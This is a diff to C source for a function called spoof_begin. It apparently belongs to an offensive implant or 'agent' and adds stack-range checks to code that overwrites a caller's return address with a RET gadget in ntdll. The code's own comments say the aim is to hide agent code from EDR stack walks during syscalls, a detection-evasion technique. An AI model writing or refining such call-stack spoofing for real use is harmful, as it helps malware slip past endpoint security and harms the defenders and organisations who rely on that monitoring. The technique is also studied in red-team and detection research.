@@ -131,30 +131,27 @@ void spoof_begin(SPOOF_CONTEXT *ctx) {
         return;
     }
 
-    void *retAddrLocation = NULL;
-
     /*
-     * Get the address of the return address on the stack.
-     * __builtin_frame_address(0) gives us the current frame pointer.
-     * The return address is at RBP+8 in the standard frame layout,
-     * but GCC may not use frame pointers with -fomit-frame-pointer.
+     * Walk the RBP frame chain to find the caller's return address and
+     * replace it with a RET gadget inside ntdll. This hides agent code
+     * from EDR stack walks during the syscall.
      *
-     * Alternative: use __builtin_return_address(0) to READ it,
-     * but we also need to WRITE it.
-     *
-     * Safest approach: use inline asm to read RSP-relative.
-     */
-    void *currentRetAddr = __builtin_return_address(0);
-
-    /*
-     * We can't directly modify the return address through a builtin.
-     * Instead, we walk the stack manually using RBP chain.
-     *
-     * NOTE: This requires -fno-omit-frame-pointer for reliability.
-     * With frame pointer omission, stack walking is unreliable.
+     * REQUIRES -fno-omit-frame-pointer — without it, RBP is a GPR and
+     * the chain is garbage, causing memory corruption and crashes.
      */
     void **rbp;
     __asm__ __volatile__("mov %%rbp, %0" : "=r"(rbp));
+
+    /* Validate RBP looks like a stack pointer (must be in a plausible
+     * stack range: above RSP, below the TEB's StackBase).
+     * This is a safety net if frame pointers are somehow missing. */
+    void *rsp;
+    __asm__ __volatile__("mov %%rsp, %0" : "=r"(rsp));
+    if ((void *)rbp <= rsp || (uintptr_t)rbp - (uintptr_t)rsp > 0x100000) {
+        /* RBP is not pointing at the stack — frame pointers are broken */
+        ctx->active = FALSE;
+        return;
+    }
 
     /* rbp[0] = saved RBP of caller
      * rbp[1] = return address of caller (= where spoof_begin returns to)
@@ -164,6 +161,12 @@ void spoof_begin(SPOOF_CONTEXT *ctx) {
      */
     void **callerRbp = (void **)rbp[0];
     if (!callerRbp) {
+        ctx->active = FALSE;
+        return;
+    }
+
+    /* Validate callerRbp is also on the stack */
+    if ((void *)callerRbp <= rsp || (uintptr_t)callerRbp - (uintptr_t)rsp > 0x100000) {
         ctx->active = FALSE;
         return;
     }
